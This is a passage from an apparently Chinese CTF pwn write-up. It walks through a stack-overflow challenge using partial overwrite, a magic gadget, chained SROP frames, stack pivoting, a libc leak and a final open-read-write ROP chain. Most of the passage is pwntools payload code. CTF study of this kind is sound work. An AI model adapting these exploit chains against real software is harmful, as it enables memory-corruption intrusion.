+<p>更底层看，便是汇编</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov rax, 0<br>mov rdi, fd<br>mov rsi, buf<br>mov rdx, size<br>syscall<br></code></pre></td></tr></table></figure>
+
+<p>更更底层呢</p>
+<p>那便是硬件在干活了</p>
+<p>我们直接忽略吧</p>
+<p>因此，我们完全可以在执行<code>SYS_read</code>读入时覆盖<code>call read</code>这个glibc函数的返回地址与rbp，从而绕过检测，控制执行流</p>
+<p>那下一步的目标呢?</p>
+<p>由于没有gadget，我们只能打<code>SROP</code>，因此思路便是寻找在栈上的libc地址，通过<code>partial overwrite</code>，覆写为<code>syscall</code></p>
+<p>并通过<code>rax</code>保存函数返回值的机制，通过读入15字节触发<code>SROP</code></p>
+<p><img src="/images/105.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p><img src="/images/113.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>找到一只野生<code>syscall</code></p>
+<p>计算读入起始地址与偏移</p>
+<p>布置payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload2 = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p64(RBP + <span class="hljs-number">0xf0</span>) + p64(read1) + p64(leave_ret)<br>payload2 += p64(RBP + <span class="hljs-number">0x100</span>) + p64(leave_ret) + p64(RBP - <span class="hljs-number">0x18</span>) + p64(leave_ret) + p64(<span class="hljs-number">0</span>) + p8(<span class="hljs-number">0xec</span>)<br></code></pre></td></tr></table></figure>
+
+<p>但是存在一个问题</p>
+<p>这个<code>syscall</code>提供的<code>SROP</code>没有那么干净，也没有那么强有力</p>
+<p>我们最想要的其实是<code>syscall ret</code></p>
+<p>因此又要学习一个新的知识点</p>
+<p><strong>magic-gadget</strong></p>
+<p>长这样:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x0000000000001252 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret<br></code></pre></td></tr></table></figure>
+
+<p>看似平平无奇</p>
+<p>实则却能发挥出巨大的威力</p>
+<p>我们通过<code>SROP</code>设置好精确计算偏移的<code>rbx</code>和<code>rbp</code></p>
+<p>然后利用这个<code>gadget</code></p>
+<p>将<code>syscall</code>覆写为<code>syscall ret</code></p>
+<p>发送<code>payload2</code>后栈布局:</p>
+<p><img src="/images/109.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>提前布置好栈风水</p>
+<p>并获得<code>syscall</code>能力(最重要)</p>
+<p>随后<code>call read</code>函数返回</p>
+<p>但是返回地址和rbp都被篡改</p>
+<p>经过一系列<code>leave ret</code>的不断迁移</p>
+<p>最终再次执行<code>read</code></p>
+<p><img src="/images/108.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>为了保护<code>syscall</code>不被破坏</p>
+<p>这次先不打栈返回</p>
+<p>正常过检测</p>
+<p>配合<code>payload2</code>提前布置好的栈风水</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload3 = LOVE * <span class="hljs-number">4</span><br>payload3 += p64(RBP) + p64(RET)<br>payload3 += p64(RBP + <span class="hljs-number">0xf0</span>) + p64(read1)<br></code></pre></td></tr></table></figure>
+
+<p>得到一个干净的<code>read</code>环境</p>
+<p><img src="/images/110.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>接下来便可以着手准备<code>SROP</code>了</p>
+<p>借用一下作者提供的一张图</p>
+<p><img src="/images/111.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>第一步:利用<code>magic-gadget</code>获得<code>syscall ret</code></p>
+<p>si</p>
+<p><code>call read</code>返回地址</p>
+<p><img src="/images/114.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>构造<code>payload4</code></p>
+<p>布置<code>sigcontext</code>的同时打<code>栈返回</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">payload4 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">8</span><br>payload4 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rdi</span><br>payload4 += p64(RBP + <span class="hljs-number">0x30</span>) <span class="hljs-comment"># rsi</span><br>payload4 += p64(RBP + <span class="hljs-number">0x65</span>) <span class="hljs-comment"># rbp</span><br>payload4 += p64(<span class="hljs-number">0x6edca</span>) <span class="hljs-comment"># rbx</span><br>payload4 += p64(<span class="hljs-number">0x200</span>) <span class="hljs-comment"># rdx</span><br>payload4 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rax </span><br>payload4 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rcx</span><br>payload4 += p64(RBP + <span class="hljs-number">0x40</span>) <span class="hljs-comment"># rsp</span><br>payload4 += p64(read2) <span class="hljs-comment"># rip</span><br>payload4 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># eflags</span><br>payload4 += p64(<span class="hljs-number">0x33</span>) <span class="hljs-comment"># cs/gs/fs</span><br>payload4 += p64(RBP + <span class="hljs-number">0x150</span> + <span class="hljs-number">1</span>) + p64(read1) + p64(RBP + <span class="hljs-number">0x20</span>) + p64(leave_ret)<br></code></pre></td></tr></table></figure>
+
+<p>发送后的栈布局:</p>
+<p><img src="/images/115.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>执行<code>leave ret</code>后再次read:</p>
+<p><img src="/images/116.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>再次打栈返回</p>
+<p>此时<code>sigcontext</code>已经布置好，只需要将rax设置为15随后<code>syscall</code></p>
+<p>注意rbp先前巧妙的设置以顺利读入15字节</p>
+<p><code>call read</code>返回地址:</p>
+<p><img src="/images/117.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>布置<code>payload5</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload5 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">7</span> + p64(pop_rbp_ret)<br></code></pre></td></tr></table></figure>
+
+<p>发送</p>
+<p>此时栈布局:</p>
+<p><img src="/images/118.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>配合先前的栈风水布局与<code>pop rbp ret</code></p>
+<p>读入15字节成功设置rax为15，随后<code>syscall</code></p>
+<p><img src="/images/119.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>触发<code>sigreturn</code></p>
+<p><img src="/images/120.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>成功控制所有寄存器并再次<code>read</code></p>
+<p>依旧布置<code>sigcontext</code>的同时打<strong>栈返回</strong></p>
+<p>原理一致，我就不贴图了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">payload6 = p64(leave_ret)<br>payload6 += p64(magic_gadget)<br>payload6 += p64(pop_rbp_ret)<br>payload6 += p64(RBP + <span class="hljs-number">0xa8</span> + <span class="hljs-number">1</span>) + p64(read1) + p64(RBP + <span class="hljs-number">0x20</span>)<br>payload6 += p64(leave_ret) + p64(RBP + <span class="hljs-number">0xd0</span>) + p64(read1) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>payload6 += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># rdi</span><br>payload6 += p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># rsi</span><br>payload6 += p64(RBP + <span class="hljs-number">0x68</span>) <span class="hljs-comment"># rbp</span><br>payload6 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rbx</span><br>payload6 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rdx</span><br>payload6 += p64(<span class="hljs-number">33</span>) <span class="hljs-comment"># rax </span><br>payload6 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rcx</span><br>payload6 += p64(RBP + <span class="hljs-number">0x28</span>) <span class="hljs-comment"># rsp</span><br>payload6 += p64(ret) <span class="hljs-comment"># rip</span><br>payload6 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># eflags</span><br>payload6 += p64(<span class="hljs-number">0x33</span>) <span class="hljs-comment"># cs/gs/fs</span><br></code></pre></td></tr></table></figure>
+
+<p>由于<code>rbp</code>和<code>rbx</code>已经被我们所控制</p>
+<p>此时执行<code>magic-gadget</code>后</p>
+<p>成功获得<code>syscall ret</code></p>
+<p><img src="/images/121.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>随后依旧<code>SROP</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload7 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">7</span> + p64(pop_rbp_ret)<br></code></pre></td></tr></table></figure>
+
+<p>配合<code>payload6</code>的<code>sigcontext</code>成功<code>dup2(1, 2)</code></p>
+<p>现在获得标准输出(<code>stdout</code>)了便能轻松泄露libc基址了</p>
+<p>同理</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">payload8 = p64(pop_rbp_ret) + p64(RBP + <span class="hljs-number">0xd8</span> + <span class="hljs-number">1</span>) + p64(read1) + p64(RBP + <span class="hljs-number">0x20</span>) + p64(leave_ret)<br>payload8 += p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># rdi</span><br>payload8 += p64(RBP + <span class="hljs-number">0x28</span>) <span class="hljs-comment"># rsi</span><br>payload8 += p64(RBP + <span class="hljs-number">0xe8</span>) <span class="hljs-comment"># rbp</span><br>payload8 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rbx</span><br>payload8 += p64(<span class="hljs-number">0x200</span>) <span class="hljs-comment"># rdx</span><br>payload8 += p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># rax </span><br>payload8 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># rcx</span><br>payload8 += p64(RBP + <span class="hljs-number">0x28</span>) <span class="hljs-comment"># rsp</span><br>payload8 += p64(ret) <span class="hljs-comment"># rip</span><br>payload8 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># eflags</span><br>payload8 += p64(<span class="hljs-number">0x33</span>) <span class="hljs-comment"># cs/gs/fs</span><br>payload8 += p64(read3)<br><br>payload9 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">7</span> + p64(pop_rbp_ret)<br></code></pre></td></tr></table></figure>
+
+<p>接收</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">syscall = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>libc_base = syscall - <span class="hljs-number">0x98fb6</span><br>success(<span class="hljs-string">&#x27;libc_base =&gt;&gt; &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>pop_rax_ret = libc_base + <span class="hljs-number">0xdd237</span><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x10f75b</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x110a4d</span><br></code></pre></td></tr></table></figure>
+
+<p>最后打<code>ORW</code>获得flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">payload10 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0xc0</span> + <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br><span class="hljs-comment"># close</span><br>payload10 += p64(pop_rax_ret) + p64(<span class="hljs-number">3</span>) + p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(syscall)<br><span class="hljs-comment"># open</span><br>payload10 += p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>) + p64(pop_rdi_ret) + p64(RBP + <span class="hljs-number">0xe8</span>) + p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(syscall)<br><span class="hljs-comment"># read</span><br>payload10 += p64(pop_rax_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi_ret) + p64(RBP) + p64(syscall)<br><span class="hljs-comment"># write</span><br>payload10 += p64(pop_rax_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi_ret) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br></code></pre></td></tr></table></figure>
+
+<p>拿下</p>
+<p><img src="/images/122.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<hr>
+<p>总结:</p>
+<p>部分过程原理一致，我便没有详细展开了</p>
+<p>但自己学习时一定要<code>hands-on</code>动手布局，<strong>调试</strong>，方能领悟其真谛</p>
+<p>同时不得不感叹</p>
+<p>这道题真是惊艳啊</p>
+<p>佩服作者的实力:</p>
+<p>orz orz orz</p>
+<div class="note note-secondary">
+            <p>本题还有个巧妙点是作者并没有刻意地去加某某知识点到题中，出题者同时也是做题者，我只是尝试加一个沙箱再加一些检测，并且没有添加额外的后门gadget，在做题的过程中下意识地运用自己知道的手段，没想到居然能串起来这么多知识点，并且用得都很顺理成章，故评价为”一件完美的艺术品，葬下了整个栈时代”</p> 
+          </div>
+
+<p>最后的最后</p>
+<p>还是引用作者的原话:</p>
+<p>感谢并恭喜你看完本篇文章，一路走来，你已经经历许多，这是现今栈利用的顶峰，能够完成本题，你已称得上</p>
+<p>“Master of Stack”!!!</p>
+<hr>
+<p><strong>一道溢出的痕，一场检测的困，一次极致的栈，一个落寞的人</strong></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn/" class="category-chain-item">pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        
+        
+          <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="print-no-link">#栈迁移</a>
+        
+      
+        
+        
+          <a href="/tags/ORW/" class="print-no-link">#ORW</a>
+        
+      
+        
+        
+          <a href="/tags/SROP/" class="print-no-link">#SROP</a>
+        
+      
+        
+        
+          <a href="/tags/ret2libc/" class="print-no-link">#ret2libc</a>
+        
+      
+        
+        
+          <a href="/tags/magic-gadget/" class="print-no-link">#magic-gadget</a>
+        
+      
+        
+        
+          <a href="/tags/partial-overwrite/" class="print-no-link">#partial overwrite</a>
+        
+      
+        
+        
+          <a href="/tags/%E6%A0%88%E9%A3%8E%E6%B0%B4/" class="print-no-link">#栈风水</a>
+        
+      
+        
+        
+          <a href="/tags/ret2syscall/" class="print-no-link">#ret2syscall</a>
+        
+      
+        
+        
+          <a href="/tags/ret2text/" class="print-no-link">#ret2text</a>
+        
+      
+        
+        
+          <a href="/tags/%E6%A0%88%E8%BF%94%E5%9B%9E/" class="print-no-link">#栈返回</a>
+        
+      
+        
+        
+          <a href="/tags/dup2/" class="print-no-link">#dup2</a>
+        
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ret2all</div>
+      <div>https://rr00xxyy.github.io/2026/03/31/ret2all/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>roxy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月31日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年4月16日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/01/network/" title="network">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">network</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/03/25/OS%E9%9A%8F%E8%AE%B0/" title="OS随记">
+                        <span class="hidden-mobile">OS随记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      <span class="footer-quote">It is no use crying over spilt milk</span>
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/mui-fluid.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
